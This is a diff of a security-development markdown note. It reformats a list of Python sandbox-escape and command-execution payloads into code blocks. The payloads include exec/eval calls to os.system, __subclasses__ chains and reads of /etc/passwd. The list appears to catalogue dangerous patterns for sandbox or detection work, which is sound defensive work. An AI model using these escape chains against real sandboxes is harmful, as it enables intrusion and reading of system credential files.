@@ -18,29 +18,37 @@ tags:  安全研发 python
 
 ### type 1: keywords
 
-1. `exec('import os ;os.system("ls")')`
-2. `eval('__import__("os").system("ls")')`
-3. `f'''{__import__('os').system('ls')}'''`
-4. `[].__class__.__mro__[-1].__subclasses__()`
-5. `_builtin__.open('/etc/passwd')`
-6. `system('ls')`
-7. `[].__class__.__base__.__subclasses__()[59]()._module.linecache.__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')   # only python2`
-8. `[].__class__.__base__.__subclasses__()[59](linecache.getlines, '/etc/password')`
-9. `[].__class__.__base__.__subclasses__()[59](exec, '("__import__("os").system("ls")")')`
+```bash
+exec('import os ;os.system("ls")')
+eval('__import__("os").system("ls")')
+f'''{__import__('os').system('ls')}'''
+[].__class__.__mro__[-1].__subclasses__()
+_builtin__.open('/etc/passwd')
+system('ls')
+[].__class__.__base__.__subclasses__()[59]()._module.linecache.__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')   # only python2`
+[].__class__.__base__.__subclasses__()[59](linecache.getlines, '/etc/password')
+[].__class__.__base__.__subclasses__()[59](exec, '("__import__("os").system("ls")")')
+
+```
 
 ### type 2: python lib
 
-1. `subprocess.Popen('ls')`
-2. `os.popen('ls')`
-3. `importlib`
-4. `builtins.open('/etc/passwd')`
-5. `linecache.getlines('/etc/passwd')`
+```bash
+subprocess.Popen('ls')
+os.popen('ls')
+importlib
+builtins.open('/etc/passwd')
+linecache.getlines('/etc/passwd')
 
+```
 ### type 3: python import
 
-1. `__import`
-2. `import`
-3. `importlib`
+```bash
+1. __import
+2. import
+3. importlib
+
+```
 
 ### type 4: other
 1. 
